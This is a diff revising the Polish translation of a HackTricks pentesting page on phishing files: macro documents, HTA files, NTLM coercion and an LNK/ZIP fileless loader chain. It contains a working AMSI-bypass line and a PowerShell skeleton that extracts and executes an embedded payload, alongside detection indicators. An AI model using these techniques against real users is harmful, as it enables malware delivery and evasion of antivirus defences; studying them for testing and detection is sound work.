@@ -1,20 +1,20 @@
-# Pliki i dokumenty phishingowe
+# Phishing Pliki i Dokumenty
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Dokumenty Microsoft Office
+## Dokumenty Office
 
-Microsoft Word przeprowadza walidację danych pliku przed jego otwarciem. Walidacja danych odbywa się w postaci identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi jakikolwiek błąd, analizowany plik nie zostanie otwarty.
+Microsoft Word wykonuje walidację danych pliku przed otwarciem go. Walidacja danych odbywa się w formie identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi jakikolwiek błąd, analizowany plik nie zostanie otwarty.
 
-Zwykle pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku poprzez zmianę rozszerzenia i nadal zachować zdolność wykonywania makr.\
-Na przykład plik RTF domyślnie nie obsługuje makr, ale plik DOCM przemianowany na RTF zostanie obsłużony przez Microsoft Word i będzie zdolny do wykonania makr.\
+Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku przez zmianę rozszerzenia i nadal zachować możliwość wykonywania makr.\
+Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM przemianowany na RTF będzie obsługiwany przez Microsoft Word i będzie zdolny do wykonania makr.\
 Te same wewnętrzne mechanizmy dotyczą całego oprogramowania z pakietu Microsoft Office (Excel, PowerPoint itp.).
 
-Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:
+Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą uruchamiane przez niektóre programy Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go) który zawiera macros mogą również „wykonywać” macros.
 
 ### Ładowanie zewnętrznego obrazu
 
@@ -25,9 +25,9 @@ _**Categories**: Links and References, **Filed names**: includePicture, and **Fi
 
 ### Macros Backdoor
 
-Można użyć macros, aby uruchomić dowolny kod z dokumentu.
+Możliwe jest użycie macros do uruchomienia dowolnego kodu z poziomu dokumentu.
 
-#### Autoload functions
+#### Funkcje autoload
 
 Im bardziej są powszechne, tym bardziej prawdopodobne, że AV je wykryje.
 
@@ -68,12 +68,12 @@ proc.Create "powershell <beacon line generated>
 
 Przejdź do **File > Info > Inspect Document > Inspect Document**, co otworzy Document Inspector. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.
 
-#### Rozszerzenie pliku
+#### Rozszerzenie dokumentu
 
-When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
-Zrób to ponieważ **nie można zapisać makr w `.docx`** i istnieje **stigma** związane z rozszerzeniem obsługującym makra **`.docm`** (np. ikona miniatury ma ogromny `!` i niektóre bramy sieciowe/emailowe blokują je całkowicie). Dlatego to **legacy `.doc` rozszerzenie jest najlepszym kompromisem**.
+Po zakończeniu wybierz rozwijane menu **Save as type**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
+Zrób tak, ponieważ **nie można zapisać makr w `.docx`** i wokół rozszerzenia obsługującego makra **`.docm`** istnieje **pewna stygma** (np. ikona miniatury ma ogromne `!` i niektóre bramy web/email całkowicie je blokują). Dlatego to **stare rozszerzenie `.doc` jest najlepszym kompromisem**.
 
-#### Generatory złośliwych makr
+#### Generatorzy złośliwych makr
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
@@ -81,9 +81,9 @@ Zrób to ponieważ **nie można zapisać makr w `.docx`** i istnieje **stigma** 
 
 ## Pliki HTA
 
-HTA to program na Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i uruchamia się jako aplikacja "w pełni zaufana", bez ograniczeń wynikających z modelu bezpieczeństwa przeglądarki.
+HTA to program dla **Windows**, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja "w pełni zaufana", bez ograniczeń modelu bezpieczeństwa przeglądarki.
 
-HTA uruchamiany jest przy użyciu **`mshta.exe`**, który zazwyczaj jest **zainstalowany** razem z **Internet Explorer**, co sprawia, że **`mshta` dependant on IE**. Jeśli więc został odinstalowany, HTA nie będą mogły się uruchomić.
+HTA jest uruchamiana za pomocą **`mshta.exe`**, które jest zazwyczaj instalowane razem z **Internet Explorer**, co powoduje, że **`mshta` jest zależne od IE**. Jeśli więc Internet Explorer został odinstalowany, HTA nie będą mogły się uruchomić.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -140,9 +140,9 @@ self.close
 ```
 ## Wymuszanie uwierzytelniania NTLM
 
-Istnieje kilka sposobów, aby **wymusić uwierzytelnianie NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do e-maili lub HTML, do których użytkownik uzyska dostęp (nawet HTTP MitM?). Albo wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnianie** już przy **otwarciu folderu.**
+Istnieje kilka sposobów, aby **wymusić uwierzytelnianie NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do emaili lub HTML, które użytkownik otworzy (nawet HTTP MitM?). Albo wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnianie** już przy **otwarciu folderu.**
 
-**Sprawdź te pomysły i więcej na poniższych stronach:**
+**Sprawdź te pomysły i więcej na następujących stronach:**
 
 
 {{#ref}}
@@ -156,24 +156,24 @@ Istnieje kilka sposobów, aby **wymusić uwierzytelnianie NTLM "zdalnie"**, na p
 
 ### NTLM Relay
 
-Pamiętaj, że możesz nie tylko ukraść hasha lub dane uwierzytelniające, lecz także **przeprowadzić NTLM relay attacks**:
+Nie zapomnij, że nie chodzi tylko o kradzież hasha czy uwierzytelnienia, lecz także o możliwość **przeprowadzenia NTLM relay attacks**:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Wysoce skuteczne kampanie dostarczają ZIP zawierający dwa legalne, mylące dokumenty (PDF/DOCX) i złośliwy .lnk. Sztuczka polega na tym, że rzeczywisty loader PowerShell jest przechowywany wewnątrz surowych bajtów ZIP po unikalnym markerze, a .lnk wyodrębnia go i uruchamia w całości w pamięci.
+Bardzo skuteczne kampanie dostarczają ZIP, który zawiera dwa legalne dokumenty-przynęty (PDF/DOCX) oraz złośliwy .lnk. Sztuczka polega na tym, że rzeczywisty PowerShell loader jest przechowany w surowych bajtach ZIP-a po unikalnym markerze, a .lnk wyodrębnia go i uruchamia w całości w pamięci.
 
-Typowy przepływ zaimplementowany przez .lnk z jednowierszowym PowerShellem:
+Typowy przebieg realizowany przez .lnk PowerShell one-liner:
 
-1) Zlokalizuj oryginalny ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz w katalogu nadrzędnym bieżącego katalogu roboczego.
-2) Odczytaj bajty ZIP i znajdź hardcodowany marker (np. xFIQCV). Wszystko po markerze to osadzona PowerShell payload.
-3) Skopiuj ZIP do %ProgramData%, wypakuj tam i otwórz mylący .docx, aby wyglądało to na legalne.
-4) Bypass AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+1) Zlokalizuj oryginalny ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, oraz w katalogu nadrzędnym bieżącego katalogu roboczego.
+2) Odczytaj bajty ZIP-a i znajdź na stałe wpisany marker (np. xFIQCV). Wszystko po markerze to osadzony PowerShell payload.
+3) Skopiuj ZIP do %ProgramData%, rozpakuj tam i otwórz przynętę .docx, aby wyglądało to legalnie.
+4) Obejście AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
 5) Deobfuskacja następnego etapu (np. usunięcie wszystkich znaków #) i wykonanie go w pamięci.
 
-Example PowerShell skeleton to carve and run the embedded stage:
+Przykładowy szkielet PowerShell do wyodrębnienia i uruchomienia osadzonego etapu:
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -191,20 +191,20 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Notatki
-- Dostarczenie często nadużywa zaufanych subdomen PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (serwując nieszkodliwe ZIPy w zależności od IP/UA).
-- Kolejny etap często odszyfrowuje base64/XOR shellcode i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.
+- Dostarczenie często nadużywa zaufanych subdomen PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (serwować nieszkodliwe ZIPs w zależności od IP/UA).
+- Kolejny etap często odszyfrowuje base64/XOR shellcode i wykonuje go przy użyciu Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.
 
 Persistence used in the same chain
-- COM TypeLib hijacking kontrolki Microsoft Web Browser, tak że IE/Explorer lub każda aplikacja ją osadzająca automatycznie ponownie uruchamia payload. Szczegóły i gotowe do użycia polecenia tutaj:
+- COM TypeLib hijacking of the Microsoft Web Browser control tak, aby IE/Explorer lub każda aplikacja ją osadzająca automatycznie ponownie uruchamiała payload. Zobacz szczegóły i gotowe polecenia tutaj:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Wykrywanie/IOCs
-- Pliki ZIP zawierające dopisany do danych archiwum ASCII marker (np. xFIQCV).
-- .lnk, który przeszukuje foldery nadrzędne/użytkownika, aby znaleźć ZIP i otworzyć dokument przynętowy.
-- Modyfikacja AMSI za pomocą [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+Hunting/IOCs
+- ZIP files zawierające ASCII marker string (np. xFIQCV) dopisany do danych archiwum.
+- .lnk, który enumeruje foldery nadrzędne/użytkownika, aby zlokalizować ZIP i otworzyć dokument przynętowy.
+- Manipulacja AMSI przez [System.Management.Automation.AmsiUtils]::amsiInitFailed.
 - Długotrwałe wątki biznesowe kończące się linkami hostowanymi pod zaufanymi domenami PaaS.
 
 ## Referencje
